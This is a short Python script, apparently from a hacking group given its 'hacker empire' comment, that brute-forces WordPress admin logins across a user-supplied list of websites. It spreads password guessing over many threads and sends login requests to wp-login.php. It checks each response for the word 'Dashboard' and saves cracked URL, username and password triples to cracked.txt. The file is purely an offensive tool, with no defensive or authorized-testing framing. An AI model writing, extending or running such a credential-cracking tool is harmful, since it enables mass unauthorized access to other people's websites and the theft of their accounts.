import threading
import requests
from colorama import *
#hacker empire
#hyper
init(autoreset=True)

url_list = []

with open(input("Enter Website List: "), "r") as file:
    for line in file:
        url_list.append(line.strip())

with open(input("Enter Username List: "), "r") as username_file:
    usernames = [line.strip() for line in username_file]

with open(input("Enter Password List: "), "r") as password_file:
    passwords = [line.strip() for line in password_file]

def check_url(url):
    response = requests.get(url)
    
    if response.status_code == 200:
        new_url = url.rstrip("/") + "/wp-login.php"
        
        for username in usernames:
            for password in passwords:
                payload = {
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                }
                
                dashboard_url = url.rstrip("/") + "/wp-admin/"
                login_response = requests.post(new_url, data=payload)
                
                if login_response.status_code == 200 and "Dashboard" in login_response.text:
                    print(Fore.GREEN + f"{dashboard_url} BOOM CRACKED Username: {username} | Password: {password}")
                    open("cracked.txt", "a").write(new_url + "#" + username + "@" + password + "\n")
                    break
            else:
                continue
            break
        else:
            print(Fore.RED + f"{new_url} An error occurred while logging in.")
    else:
        print(Fore.RED + f"{url} An error occurred at the address.")

threads = []
for url in url_list:
    t = threading.Thread(target=check_url, args=(url,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()